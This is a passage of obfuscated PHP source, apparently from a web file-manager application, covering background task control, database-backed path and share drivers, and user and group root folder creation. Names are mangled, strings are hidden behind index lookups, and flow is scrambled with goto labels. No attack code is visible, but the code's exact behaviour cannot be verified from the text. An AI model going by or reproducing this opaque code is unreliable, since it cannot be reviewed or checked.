$Ôğ³¥¶Ş[$ŞÁÏÁè—[817]]; $Ôğ³¥¶Ş[$ŞÁÏÁè—[1771]] = $Òí¹†‘Ş[$ŞÁÏÁè—[1771]] ? $Òí¹†‘Ş[$ŞÁÏÁè—[1771]] : 0; $Ôğ³¥¶Ş[$ŞÁÏÁè—[1770]] = timeFloat(); Hook::trigger($ŞÁÏÁè—[1785], $Ôğ³¥¶Ş); self::valueSet($Ôğ³¥¶Ş[$ŞÁÏÁè—[475]], $Ôğ³¥¶Ş); } public function onKillSet($Á–¦¹¬, $œ‡ñ‚ÉÓ = array()) { $this->onKillCall = array($Á–¦¹¬, $œ‡ñ‚ÉÓ); } public function onKill() { $ÖÊŸ =& $_SERVER[Ş­ğŠìÒ]; self::log($ÖÊŸ[1778] . $this->task[$ÖÊŸ[475]] . $ÖÊŸ[1786]); Hook::trigger($ÖÊŸ[1787], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Ç¦‚) { $ÂÊÆ…ß¬ =& $_SERVER[Ş­ğŠìÒ]; Cache::set($ÂÊÆ…ß¬[1784] . $this->task[$ÂÊÆ…ß¬[475]], $Ç¦‚, 60); return $Ç¦‚; } public static function get($”íÔã„Ë) { $˜›Òª½ =& $_SERVER[Ş­ğŠìÒ]; $®Æì¶äô = self::valueGet($”íÔã„Ë); if (is_array($®Æì¶äô) && $®Æì¶äô[$˜›Òª½[1788]]) { $ì÷Æäóß = ActionApply($®Æì¶äô[$˜›Òª½[1788]], array($®Æì¶äô)); $®Æì¶äô = is_array($ì÷Æäóß) ? $ì÷Æäóß : $®Æì¶äô; } return $®Æì¶äô; } public static function listData() { $˜ŸÀ¶Îµ = self::valueGet(); return array_sort_by($˜ŸÀ¶Îµ, $_SERVER[Ş­ğŠìÒ][1768], !0); } public static function kill($´Î˜‘ö§) { return self::changeStatus($´Î˜‘ö§, self::STATYS_KILL); } public static function stop($ïÍÓ®à) { return self::changeStatus($ïÍÓ®à, self::STATYS_STOP); } public static function restart($á×›À¿©) { return self::changeStatus($á×›À¿©, self::STATYS_RUNNING); } public static function killAll() { $›˜Û„“„ =& $_SERVER[Ş­ğŠìÒ]; $éİõá·« = self::listData(); foreach ($éİõá·« as $øËÈ„ßï) { self::kill($øËÈ„ßï[$›˜Û„“„[475]]); } sleep(2); foreach ($éİõá·« as $øËÈ„ßï) { self::valueSet($øËÈ„ßï[$›˜Û„“„[475]], !1); } } private static function changeStatus($—öä¤“, $ºÛà¾ò˜) { $ìÎúâ‘Ç =& $_SERVER[Ş­ğŠìÒ]; $İ’ƒÚÚ = self::valueGet($—öä¤“); if (!$İ’ƒÚÚ) { return !1; } $İ’ƒÚÚ[$ìÎúâ‘Ç[817]] = $ºÛà¾ò˜; self::valueSet($—öä¤“, $İ’ƒÚÚ); self::log($ìÎúâ‘Ç[1789] . $İ’ƒÚÚ[$ìÎúâ‘Ç[475]] . $ìÎúâ‘Ç[1790] . $ºÛà¾ò˜); return !0; } public static function valueGet($åÔ‰º°± = false) { $¢é±áä® =& $_SERVER[Ş­ğŠìÒ]; if ($åÔ‰º°±) { $Ç™É·±à = Model($¢é±áä®[520])->where(array($¢é±áä®[97] => $åÔ‰º°±, $¢é±áä®[33] => $¢é±áä®[1146]))->find(); return $Ç™É·±à ? json_decode($Ç™É·±à[$¢é±áä®[450]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Ì¾óî Ÿ = false) { $¨³Ô–¨Ø =& $_SERVER[Ş­ğŠìÒ]; $Ÿ½ŸÙá“ = array($¨³Ô–¨Ø[33] => $¨³Ô–¨Ø[1146]); if ($Ì¾óî Ÿ) { $Ÿ½ŸÙá“[$¨³Ô–¨Ø[1764]] = $Ì¾óî Ÿ; } $õ¥Åïœ¼ = Model($¨³Ô–¨Ø[520])->where($Ÿ½ŸÙá“)->select(); $õ¥Åïœ¼ = $õ¥Åïœ¼ ? $õ¥Åïœ¼ : array(); foreach ($õ¥Åïœ¼ as $ƒØ¼ä‡ => $èù€êã‰) { $õ¥Åïœ¼[$ƒØ¼ä‡] = json_decode($èù€êã‰[$¨³Ô–¨Ø[450]], !0); } return $õ¥Åïœ¼; } public static function valueSet($Ûı»ºÑä, $ÊŠƒéñ¬) { $öœĞìúİ =& $_SERVER[Ş­ğŠìÒ]; if (!$ÊŠƒéñ¬) { return Model($öœĞìúİ[520])->where(array($öœĞìúİ[97] => $Ûı»ºÑä, $öœĞìúİ[33] => $öœĞìúİ[1146]))->delete(); } $ºÊñ÷¾Ü = json_encode($ÊŠƒéñ¬); if (!$ºÊñ÷¾Ü) { ob_start(); var_dump($ÊŠƒéñ¬); $ÚåõÆ©™ = ob_get_clean(); self::log($öœĞìúİ[1791] . json_encode_force($ÚåõÆ©™)); } if (!$Ûı»ºÑä || !$ÊŠƒéñ¬[$öœĞìúİ[475]]) { return !1; } $±¢ğÑ¹· = array($öœĞìúİ[33] => $öœĞìúİ[1146], $öœĞìúİ[1764] => USER_ID, $öœĞìúİ[97] => $Ûı»ºÑä, $öœĞìúİ[450] => $ºÊñ÷¾Ü); $®÷Õ”¢¦ = $öœĞìúİ[1792]; CacheLock::lock($®÷Õ”¢¦); Model($öœĞìúİ[520])->add($±¢ğÑ¹·, array(), !0); CacheLock::unlock($®÷Õ”¢¦); } public static function log($Úô©Ô»ò) { if (!GLOBAL_DEBUG) { return; } write_log($Úô©Ô»ò, $_SERVER[Ş­ğŠìÒ][1793]); } } goto b’¤‡ôĞ¯; B˜³ÛÉÇáÄ: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¶ÉÎÖ…) { $this->pathParse = $¶ÉÎÖ…; $this->model = Model($_SERVER[Ş­ğŠìÒ][1414]); } public function getPath($™æÖ‰£) { return trim($™æÖ‰£, $_SERVER[Ş­ğŠìÒ][8]); } public function pathFather($íÚèîè¸) { $û…ôÉËÀ = $this->parse($íÚèîè¸); $û…ôÉËÀ = $this->infoSimple($íÚèîè¸); return $û…ôÉËÀ ? $û…ôÉËÀ[$_SERVER[Ş­ğŠìÒ][192]] : !1; } public function pathThis($úØº¿÷‘) { $ù’æ‰ = $this->infoSimple($úØº¿÷‘); return $ù’æ‰ ? $ù’æ‰[$_SERVER[Ş­ğŠìÒ][32]] : !1; } public function getPathOuter($»‰êŒïé) { if (!$»‰êŒïé) { return $»‰êŒïé; } $³‹ÄÈÊĞ = $this->parse($»‰êŒïé); return KodIO::make($³‹ÄÈÊĞ[$_SERVER[Ş­ğŠìÒ][475]]); } public function copyFolderFromIO($¯„¾¹Ö, $ÅâšÆñÓ, $İ¥şÍ§, $†‹ªã, $ÉßÁúğ) { $Á˜ç½éŞ = $this->model->copyFolderFromIO($¯„¾¹Ö, $ÅâšÆñÓ, $İ¥şÍ§, $†‹ªã, $ÉßÁúğ); return KodIO::make($Á˜ç½éŞ); } public function isParentOf($¼®ùıĞĞ, $º˜·Ø„†) { return $this->model->isParentOf($¼®ùıĞĞ, $º˜·Ø„†); } public function mkfile($ŒŸÏ«úé, $¨Úì– = '', $äè„™–Ø = REPEAT_RENAME) { $˜ƒÆê¢¹ =& $_SERVER[Ş­ğŠìÒ]; $ª÷³ãî = $this->parse($ŒŸÏ«úé); $ŒŸÏ«úé = $ª÷³ãî[$˜ƒÆê¢¹[475]]; for ($Åé­âôç = 0; $Åé­âôç < count($ª÷³ãî[$˜ƒÆê¢¹[1415]]); $Åé­âôç++) { $÷Šı‘Ñ = $ª÷³ãî[$˜ƒÆê¢¹[1415]][$Åé­âôç]; if ($Åé­âôç == count($ª÷³ãî[$˜ƒÆê¢¹[1415]]) - 1) { $ŒŸÏ«úé = $this->model->mkfile($ŒŸÏ«úé, $÷Šı‘Ñ, $¨Úì–, $äè„™–Ø); break; } $ŒŸÏ«úé = $this->model->mkdir($ŒŸÏ«úé, $÷Šı‘Ñ, REPEAT_SKIP); } return $this->getPathOuter($ŒŸÏ«úé); } public function mkdir($÷ëÆ ¸, $Ïò²•Ô¬ = REPEAT_SKIP) { $â•Ã–… =& $_SERVER[Ş­ğŠìÒ]; $æÆî…æ¹ = $this->parse($÷ëÆ ¸); $÷ëÆ ¸ = $æÆî…æ¹[$â•Ã–…[475]]; for ($§Ø‘Ï‡ = 0; $§Ø‘Ï‡ < count($æÆî…æ¹[$â•Ã–…[1415]]); $§Ø‘Ï‡++) { $¸â®Ÿ™À = $æÆî…æ¹[$â•Ã–…[1415]][$§Ø‘Ï‡]; $÷ëÆ ¸ = $this->model->mkdir($÷ëÆ ¸, $¸â®Ÿ™À, $Ïò²•Ô¬); } return $this->getPathOuter($÷ëÆ ¸); } public function copyFile($ßÒ’–¨Œ, $ùÕÚ¾³”, $•˜ÄŞÖ = REPEAT_REPLACE) { $œ¾¤¿® =& $_SERVER[Ş­ğŠìÒ]; $ÕœŸÅ‚ = $this->parse($ùÕÚ¾³”); $Ù‘ôÖ‰¯ = $this->model->copy($ßÒ’–¨Œ, $ÕœŸÅ‚[$œ¾¤¿®[475]], $•˜ÄŞÖ, $ÕœŸÅ‚[$œ¾¤¿®[87]]); return $Ù‘ôÖ‰¯ ? $this->getPathOuter($Ù‘ôÖ‰¯) : !1; } public function moveFile($¦ÙÈ¨òô, $İüÓ¶¨‰, $Ë«ûÎø± = REPEAT_REPLACE) { $À›¯Ç™ª =& $_SERVER[Ş­ğŠìÒ]; $•×ì£Æ = $this->parse($İüÓ¶¨‰); $æ„±„İø = $this->model->move($¦ÙÈ¨òô, $•×ì£Æ[$À›¯Ç™ª[475]], $Ë«ûÎø±, $•×ì£Æ[$À›¯Ç™ª[87]]); return $æ„±„İø ? $this->getPathOuter($æ„±„İø) : !1; } public function copy($ù…ÖõÚ, $Ù½Ş×šİ, $»ÕÈ­© = REPEAT_REPLACE, $¾ÀŠî¡¨ = false) { $Ê ÃŒÃ÷ = $this->parse($Ù½Ş×šİ); $ËºÄßö = $this->model->copy($ù…ÖõÚ, $Ê ÃŒÃ÷[$_SERVER[Ş­ğŠìÒ][475]], $»ÕÈ­©, $¾ÀŠî¡¨); return $ËºÄßö ? $this->getPathOuter($ËºÄßö) : !1; } public function moveSameAllow() { } public function move($ùıë“öË, $œùÑââ², $Àç›¦Æ‘ = REPEAT_REPLACE, $†úê¿†º = false) { $ò¾Š¥Ñ‡ = $this->parse($œùÑââ²); $Ë·ŸËÌ = $this->model->move($ùıë“öË, $ò¾Š¥Ñ‡[$_SERVER[Ş­ğŠìÒ][475]], $Àç›¦Æ‘, $†úê¿†º); return $Ë·ŸËÌ ? $this->getPathOuter($Ë·ŸËÌ) : !1; } public function remove($³ŸöØŸÄ, $§€¢¿š‰ = true) { return $this->model->remove($³ŸöØŸÄ, $§€¢¿š‰); } public function rename($Ğ‘Á€, $äœŠßşê) { $®¢«›à = $this->model->rename($Ğ‘Á€, $äœŠßşê); return $®¢«›à ? $this->getPathOuter($Ğ‘Á€) : $®¢«›à; } public function size($Ì‰ù•§¿) { $‹·¸äãÌ = $this->infoSimple($Ì‰ù•§¿); return $‹·¸äãÌ ? $‹·¸äãÌ[$_SERVER[Ş­ğŠìÒ][79]] : 0; } public function infoSimple($ôŠ‚Œ¨¢) { return $this->model->sourceInfo($ôŠ‚Œ¨¢); } public function info($‹ƒÃáŸõ) { return $this->infoParse($‹ƒÃáŸõ); } public function infoAuth($ÍµãÊ¤ñ) { return $this->infoParse($ÍµãÊ¤ñ, !1, !0); } public function infoWithChildren($Âô…íö) { return $this->infoParse($Âô…íö, !0); } protected function infoParse($¬Š—¡°Ñ, $½Ëúœ¨Á = false, $•†ßĞ¸Ù = false) { if (!$½Ëúœ¨Á) { return $this->model->pathInfo($¬Š—¡°Ñ, $•†ßĞ¸Ù); } return $this->model->pathInfoMore($¬Š—¡°Ñ); } public function infoFullSimple($º¡çñòÎ) { $¦Ïöë…È =& $_SERVER[Ş­ğŠìÒ]; $”…ı–Âƒ = explode($¦Ïöë…È[8], $º¡çñòÎ); $ó¤¡±ÃÖ = implode($¦Ïöë…È[8], array_splice($”…ı–Âƒ, 1)); return $this->model->pathInfoByPath($”…ı–Âƒ[0], $ó¤¡±ÃÖ); } public function infoFull($ôŠæœüÒ) { $µü¿§®± = $this->infoFullSimple($ôŠæœüÒ); return is_array($µü¿§®±) ? $this->model->pathInfo($µü¿§®±[$_SERVER[Ş­ğŠìÒ][193]]) : !1; } public function hashSimple($ÕƒåĞ“Á) { $š–”Ú¥ñ =& $_SERVER[Ş­ğŠìÒ]; $›ÂÅË®€ = $this->infoWithChildren($ÕƒåĞ“Á); return $›ÂÅË®€[$š–”Ú¥ñ[170]][$š–”Ú¥ñ[672]]; } public function hashMd5($‹Ë¿–Œ) { $ÄÌœœñ÷ =& $_SERVER[Ş­ğŠìÒ]; $š•óÎˆŸ = $this->infoWithChildren($‹Ë¿–Œ); return $š•óÎˆŸ[$ÄÌœœñ÷[170]][$ÄÌœœñ÷[547]]; } public function exist($Í¦²öØ) { $¸ÂÎàÀÜ =& $_SERVER[Ş­ğŠìÒ]; $•¹†ÜêÂ = $this->parse($Í¦²öØ); if (!$•¹†ÜêÂ[$¸ÂÎàÀÜ[87]]) { return $this->isFile($Í¦²öØ) || $this->isFolder($Í¦²öØ); } $ƒöÏÅ¶‘ = array($¸ÂÎàÀÜ[477] => $•¹†ÜêÂ[$¸ÂÎàÀÜ[475]], $¸ÂÎàÀÜ[32] => $•¹†ÜêÂ[$¸ÂÎàÀÜ[87]]); $À³Ïí«Ó = $this->model->where($ƒöÏÅ¶‘)->find(); return $À³Ïí«Ó ? !0 : !1; } public function isFile($¡Í¾ñÂ) { $ıŸõËŸÏ =& $_SERVER[Ş­ğŠìÒ]; $œØ÷Æş = $this->infoSimple($¡Í¾ñÂ); return $œØ÷Æş && $œØ÷Æş[$ıŸõËŸÏ[485]] == $ıŸõËŸÏ[228] ? !0 : !1; } public function isFolder($Úú–»¯ê) { $‡Ÿ­ğäç =& $_SERVER[Ş­ğŠìÒ]; $é İåŠœ = $this->infoSimple($Úú–»¯ê); return $é İåŠœ && $é İåŠœ[$‡Ÿ­ğäç[485]] == $‡Ÿ­ğäç[91] ? !0 : !1; } public function listPath($“»©‰, $ÂÛ¬Ì³Ú = false) { $Ï–¡ñ±² =& $_SERVER[Ş­ğŠìÒ]; if ($“»©‰ == $Ï–¡ñ±²[12]) { return !1; } $™˜ÏÄå = array($Ï–¡ñ±²[477] => $“»©‰); if ($ÂÛ¬Ì³Ú) { return $this->model->listSource($™˜ÏÄå, -1); } return $this->model->listSource($™˜ÏÄå); } public function has($˜‡—ã­, $èéÕ€±Ô = false, $‘éŞ­ç™ = null) { $Ô‡ÊŠÏ’ =& $_SERVER[Ş­ğŠìÒ]; $Âîëî»Ï = $this->infoWithChildren($˜‡—ã­); if ($èéÕ€±Ô) { return array($Ô‡ÊŠÏ’[240] => $Âîëî»Ï[$Ô‡ÊŠÏ’[240]], $Ô‡ÊŠÏ’[239] => $Âîëî»Ï[$Ô‡ÊŠÏ’[239]]); } return $‘éŞ­ç™ ? $Âîëî»Ï[$Ô‡ÊŠÏ’[240]] : $Âîëî»Ï[$Ô‡ÊŠÏ’[239]]; } public function listAll($ÏĞ¶Àá«) { $¶Ç„¹÷û = IO::info($this->pathParse[$_SERVER[Ş­ğŠìÒ][87]]); if (!$¶Ç„¹÷û) { return array(); } return $this->model->listAll($ÏĞ¶Àá«); } public function getContent($Ô¢ˆØø«) { return $this->model->getContent($Ô¢ˆØø«); } public function setContent($€Õ£ÖÃÕ, $«úİ´³Ù = '') { return $this->model->setContent($€Õ£ÖÃÕ, $«úİ´³Ù); } public function fileSubstr($Ü½Ã¿µ, $½¤¸£…œ, $¬‰Ê·Šü) { return $this->model->fileSubstr($Ü½Ã¿µ, $½¤¸£…œ, $¬‰Ê·Šü); } public function download($†×ÆöÈğ, $¢üÅ˜Š = '') { $Ìßœö»Ï = get_path_father($¢üÅ˜Š); $½“Ú˜—Õ = get_path_this($¢üÅ˜Š); $ş‹¥ ø„ = $this->model->fileInfoGet($†×ÆöÈğ); $›…ÆÏ±£ = IO::copy($ş‹¥ ø„[$_SERVER[Ş­ğŠìÒ][87]], $Ìßœö»Ï, !1, $½“Ú˜—Õ); return $›…ÆÏ±£; } public function setModifyTime($´â†‹à, $ÃŒ¥‰Ò³ = '') { $—”ë•Ğª =& $_SERVER[Ş­ğŠìÒ]; if (!$´â†‹à) { return; } $this->model->where(array($—”ë•Ğª[491] => $´â†‹à))->save(array($—”ë•Ğª[88] => $ÃŒ¥‰Ò³)); } public function upload($“Ÿà—¨©, $ø¹„Ù•¯, $ŒËø£ì— = false, $„áÚÀßõ = REPEAT_REPLACE) { $£úÁÀü° =& $_SERVER[Ş­ğŠìÒ]; $õÅáúÚ¾ = $this->parse($“Ÿà—¨©); $¦ô´ãÙö = $this->model->addFile($õÅáúÚ¾[$£úÁÀü°[475]], $ø¹„Ù•¯, $õÅáúÚ¾[$£úÁÀü°[87]], $ŒËø£ì—, $„áÚÀßõ); return $this->getPathOuter($¦ô´ãÙö); } public function uploadFileByID($Ë£úêÉë, $Ÿ¾·ÂøŞ, $¶ÂÂİ¸°) { $íÛ§ñ¬õ =& $_SERVER[Ş­ğŠìÒ]; $›Á¯ˆ×÷ = $this->parse($Ë£úêÉë); $ƒÀˆßµ = $this->model->addFileByFileID($›Á¯ˆ×÷[$íÛ§ñ¬õ[475]], $Ÿ¾·ÂøŞ, $›Á¯ˆ×÷[$íÛ§ñ¬õ[87]], $¶ÂÂİ¸°); return $this->getPathOuter($ƒÀˆßµ); } public function addFileByRemote($ğ—ÀÆÚê, $ÔœŠü², $êèå€¶ = array(), $àî‹”ş¢ = '', $ãëÜ…Ì») { $Æƒá„Ú =& $_SERVER[Ş­ğŠìÒ]; $¬³áâŸé = $this->parse($ğ—ÀÆÚê); $àî‹”ş¢ = empty($àî‹”ş¢) ? $¬³áâŸé[$Æƒá„Ú[87]] : $àî‹”ş¢; $€Œ©ÇÄø = $this->model->addFileByRemote($¬³áâŸé[$Æƒá„Ú[475]], $ÔœŠü², $àî‹”ş¢, $êèå€¶, $ãëÜ…Ì»); return $this->getPathOuter($€Œ©ÇÄø); } public function uploadLink($şáûîê„, $”†Å±†‹ = 0) { $³¬–¶‰¥ =& $_SERVER[Ş­ğŠìÒ]; $¤²¿Åâé = $this->parse($şáûîê„); $»‰Ôæ±ê = _get($GLOBALS[$³¬–¶‰¥[7]], $³¬–¶‰¥[1416]); $òá´Úú = _get($GLOBALS[$³¬–¶‰¥[7]], $³¬–¶‰¥[1417]); $şáûîê„ = Model($³¬–¶‰¥[674])->createFileName($¤²¿Åâé[$³¬–¶‰¥[87]], $»‰Ôæ±ê, $òá´Úú); return IO::uploadLink($şáûîê„, $”†Å±†‹); } public function fileNameAuto($ÓÍá˜·¸, $¼­ûïà, $³õ½ÑËÙ = REPEAT_REPLACE, $äõñ—İñ = false) { return $this->model->fileNameAuto($ÓÍá˜·¸, $¼­ûïà, $³õ½ÑËÙ, $äõñ—İñ); } public function fileNameExist($ï­€ŞÂÏ, $¡æŠ‘ş¥) { return $this->model->fileNameExist($ï­€ŞÂÏ, $¡æŠ‘ş¥); } protected function _fileOut($üúŠ›ˆå, $ùŒúØ…ß = false, $„£Æƒ‘Ù = false, $ÙÍ„Ößí = '', $İ§Ü¦„‰ = false) { $°ŒÆİáÀ =& $_SERVER[Ş­ğŠìÒ]; $ÛÀ©ÈÉ® = $this->model->sourceInfo($üúŠ›ˆå); if ($ÛÀ©ÈÉ®[$°ŒÆİáÀ[485]] == $°ŒÆİáÀ[91]) { header($°ŒÆİáÀ[1418]); die; } $ˆİØ ê« = $this->model->fileInfoGet($üúŠ›ˆå); $ÙÍ„Ößí = $ˆİØ ê«[$°ŒÆİáÀ[547]] ? $ˆİØ ê«[$°ŒÆİáÀ[547]] : $ÙÍ„Ößí; $º‰Ä”òâ = isset($GLOBALS[$°ŒÆİáÀ[182]]) && is_array($GLOBALS[$°ŒÆİáÀ[182]]) ? $GLOBALS[$°ŒÆİáÀ[182]][$°ŒÆİáÀ[32]] : $ÛÀ©ÈÉ®[$°ŒÆİáÀ[32]]; if ($İ§Ü¦„‰) { return IO::fileOutServer($ˆİØ ê«[$°ŒÆİáÀ[87]], $ùŒúØ…ß, $º‰Ä”òâ, $ÙÍ„Ößí); } IO::fileOut($ˆİØ ê«[$°ŒÆİáÀ[87]], $ùŒúØ…ß, $º‰Ä”òâ, $ÙÍ„Ößí); } public function fileOut($Ø¡ÖŞÌè, $Ú¢¾¦ª = false, $ Åô¾·¢ = false, $š÷©á¬Î = '') { $this->_fileOut($Ø¡ÖŞÌè, $Ú¢¾¦ª, $ Åô¾·¢, $š÷©á¬Î); } public function fileOutServer($˜ç¼·øÍ, $—Í¥ô£Š = false, $¢¬Ô“İª = false, $äè°©ğö = '') { $this->_fileOut($˜ç¼·øÍ, $—Í¥ô£Š, $¢¬Ô“İª, $äè°©ğö, !0); } protected function _fileOutImage($ß³ã§İü, $ÕùŸ‘Ìç = 250) { $Û¤½Ê­ =& $_SERVER[Ş­ğŠìÒ]; $¥•íÀ‹ó = $this->model->pathInfo($ß³ã§İü); if ($¥•íÀ‹ó[$Û¤½Ê­[485]] == $Û¤½Ê­[91]) { show_json($Û¤½Ê­[1419] . $ß³ã§İü, !1); } $Û¨¹ŒÛš = $this->model->fileInfoGet($ß³ã§İü); $¥•íÀ‹ó[$Û¤½Ê­[183]] = $Û¨¹ŒÛš[$Û¤½Ê­[87]]; $GLOBALS[$Û¤½Ê­[182]] = $¥•íÀ‹ó; IO::fileOutImage($Û¨¹ŒÛš[$Û¤½Ê­[87]], $ÕùŸ‘Ìç); } public function fileOutImage($ïĞŸ³¤, $ö¡õ¬õ = 250) { $this->_fileOutImage($ïĞŸ³¤, $ö¡õ¬õ); } public function fileOutImageServer($¦Ù»­Õ, $±ù‚ïµ = 250) { $this->_fileOutImage($¦Ù»­Õ, $±ù‚ïµ); } public function link($¶ßÍ­ªè, $Âùæ˜ñ¤ = '') { $Éõğóâï = $this->model->fileInfoGet($¶ßÍ­ªè); return IO::link($Éõğóâï[$_SERVER[Ş­ğŠìÒ][87]], $Âùæ˜ñ¤); } protected function parse($š©˜ŞÎï) { $Ù¿Äàó =& $_SERVER[Ş­ğŠìÒ]; if (strstr($š©˜ŞÎï, $Ù¿Äàó[8]) === !1) { return array($Ù¿Äàó[493] => intval($š©˜ŞÎï), $Ù¿Äàó[87] => $Ù¿Äàó[12], $Ù¿Äàó[1415] => array()); } $¦Îö›Ææ = explode($Ù¿Äàó[8], trim($š©˜ŞÎï, $Ù¿Äàó[8])); if (count($¦Îö›Ææ) < 2) { show_tips(clear_html($š©˜ŞÎï) . $Ù¿Äàó[1420]); } return array($Ù¿Äàó[493] => intval($¦Îö›Ææ[0]), $Ù¿Äàó[87] => $¦Îö›Ææ[1], $Ù¿Äàó[1415] => array_slice($¦Îö›Ææ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($©¬ùïË÷) { $this->pathParse = $©¬ùïË÷; $this->model = Model($_SERVER[Ş­ğŠìÒ][1414]); } public function getPathOuter($ĞÉüãû) { $ßó¡áÅı =& $_SERVER[Ş­ğŠìÒ]; if (!$ĞÉüãû) { return $ĞÉüãû; } $„¨¦òõÚ = $this->parse($ĞÉüãû); return trim(KodIO::makeShare($this->pathParse[$ßó¡áÅı[475]], $„¨¦òõÚ[$ßó¡áÅı[475]]), $ßó¡áÅı[8]); } protected function infoParse($Õ¢é›’, $¦Ù™¡ÃÚ = false, $àÌ¡ˆíã = false) { $¦Ù‡­ğ =& $_SERVER[Ş­ğŠìÒ]; $”¸õÊ÷¿ = $this->pathParse[$¦Ù‡­ğ[475]]; $Ãè‰¡‚Í = trim($this->pathParse[$¦Ù‡­ğ[1246]], $¦Ù‡­ğ[8]); return Action($¦Ù‡­ğ[1421])->sharePathInfo($”¸õÊ÷¿, $Ãè‰¡‚Í, $¦Ù™¡ÃÚ); } public function infoFull($£°š‹¥ë) { $’¶°§Î =& $_SERVER[Ş­ğŠìÒ]; $´î…ÔÃ¹ = explode($’¶°§Î[8], trim($£°š‹¥ë, $’¶°§Î[8])); if (count($´î…ÔÃ¹) > 1) { $²•Şíˆˆ = implode($’¶°§Î[8], array_splice($´î…ÔÃ¹, 1)); $Áè†¯šª = $this->model->pathInfoByPath($´î…ÔÃ¹[0], $²•Şíˆˆ); if (!$Áè†¯šª) { return !1; } $this->pathParse[$’¶°§Î[1246]] = $Áè†¯šª[$’¶°§Î[193]]; } return $this->infoParse($£°š‹¥ë); } public function listAll($ŸÑöï²Â) { $âÂç„‚ =& $_SERVER[Ş­ğŠìÒ]; $ı„ŸÛü¿ = IO::info($this->pathParse[$âÂç„‚[87]]); if (!$ı„ŸÛü¿) { return array(); } $œßÌ”Û = $this->model->listAll($ŸÑöï²Â); $»şİë¾æ = Model($âÂç„‚[664])->getInfo($ı„ŸÛü¿[$âÂç„‚[665]]); foreach ($œßÌ”Û as &$Ã¦ÒÑêŞ) { check_abort(); $Ã¦ÒÑêŞ[$âÂç„‚[90]] = Action($âÂç„‚[1421])->_shareItemeParse($Ã¦ÒÑêŞ[$âÂç„‚[90]], $»şİë¾æ); } unset($Ã¦ÒÑêŞ); return $œßÌ”Û; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($è¥œ¸ùÏ) { $this->pathParse = $è¥œ¸ùÏ; $this->model = Model($_SERVER[Ş­ğŠìÒ][1414]); } protected function infoParse($×²“Àï¦, $’“ŠÀ¨Ù = false, $°Ÿ”ÓÍ² = false) { $ÊìÃÅÆÃ =& $_SERVER[Ş­ğŠìÒ]; return Action($ÊìÃÅÆÃ[1252])->sharePathInfo($this->pathParse[$ÊìÃÅÆÃ[87]], !0, $’“ŠÀ¨Ù); } public function listPath($½Øİõ®, $î¡»÷„Ü = false) { $à¦¦²Ï =& $_SERVER[Ş­ğŠìÒ]; $ä«áûû = parent::listPath($½Øİõ®, $î¡»÷„Ü); if (!$ä«áûû) { return $ä«áûû; } if (is_array($ä«áûû[$à¦¦²Ï[1422]])) { $ä«áûû[$à¦¦²Ï[1422]] = Action($à¦¦²Ï[1252])->shareItemInfo($ä«áûû[$à¦¦²Ï[1422]]); } foreach ($ä«áûû as $é´¼Ìñ => $æ½ÅË¿¾) { if (!in_array($é´¼Ìñ, array($à¦¦²Ï[86], $à¦¦²Ï[85]))) { continue; } foreach ($æ½ÅË¿¾ as $®µÑÆÂ => $µƒıÂ¯Ø) { $ä«áûû[$é´¼Ìñ][$®µÑÆÂ] = Action($à¦¦²Ï[1252])->shareItemInfo($µƒıÂ¯Ø); } } return $ä«áûû; } public function listAll($ûÜê’À¶) { $¶ÛÔ—»Ú =& $_SERVER[Ş­ğŠìÒ]; $İ€¢åÒÎ = IO::info($this->pathParse[$¶ÛÔ—»Ú[87]]); if (!$İ€¢åÒÎ) { return array(); } $İŒ·õü¼ = $this->model->listAll($ûÜê’À¶); foreach ($İŒ·õü¼ as &$Ç¤ôàÍÊ) { $Ç¤ôàÍÊ[$¶ÛÔ—»Ú[90]] = Action($¶ÛÔ—»Ú[1252])->shareItemInfo($Ç¤ôàÍÊ[$¶ÛÔ—»Ú[90]]); } unset($Ç¤ôàÍÊ); return $İŒ·õü¼; } } goto CÑÍ¾‹éÖÕ; Bó¾¤·Êµ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ùÚ¾µµÏ) { $½šÄºùû =& $_SERVER[Ş­ğŠìÒ]; $­Ìó­¾ı = Model($½šÄºùû[577])->where(array($½šÄºùû[1755] => $ùÚ¾µµÏ))->find(); $¬åšÂå£ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ùÚ¾µµÏ, $­Ìó­¾ı[$½šÄºùû[32]]); $this->userDesktopAdd($¬åšÂå£); return $¬åšÂå£; } public function userDesktopAdd($¥—Â‚«Ç) { $Õ‘³³… =& $_SERVER[Ş­ğŠìÒ]; $‚š ´»í = LNG($Õ‘³³…[2243]); $ÂáË•Ì = $this->mkdir($¥—Â‚«Ç, $‚š ´»í); $this->metaSet($ÂáË•Ì, $Õ‘³³…[2244], $Õ‘³³…[91]); $this->metaSet($¥—Â‚«Ç, $Õ‘³³…[2245], $ÂáË•Ì); } public function userPathSafeAdd($Ó”Ø‹ëê) { $Ñ¤Ôõï¤ =& $_SERVER[Ş­ğŠìÒ]; $Ç­üõ = Model($Ñ¤Ôõï¤[577])->getInfoFull($Ó”Ø‹ëê); if (!$Ç­üõ) { return !1; } if (_get($Ç­üõ, $Ñ¤Ôõï¤[599])) { return $Ç­üõ[$Ñ¤Ôõï¤[539]][$Ñ¤Ôõï¤[2246]]; } $‰ãõõ¿ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ó”Ø‹ëê, $Ñ¤Ôõï¤[2247], $Ñ¤Ôõï¤[506]); Model($Ñ¤Ôõï¤[577])->metaSet($Ó”Ø‹ëê, $Ñ¤Ôõï¤[2246], $‰ãõõ¿); $this->metaSet($‰ãõõ¿, $Ñ¤Ôõï¤[2248], $Ó”Ø‹ëê); return $‰ãõõ¿; } public function groupRootAdd($éË«â›Ï) { $ú›üÑËÔ =& $_SERVER[Ş­ğŠìÒ]; $ıİ¾–›¤ = Model($ú›üÑËÔ[585])->where(array($ú›üÑËÔ[2056] => $éË«â›Ï))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $éË«â›Ï, $ıİ¾–›¤[$ú›üÑËÔ[32]]); } public function systemRootPathAdd($„çˆÛÒË) { if ($„çˆÛÒË != $_SERVER[Ş­ğŠìÒ][605]) { return 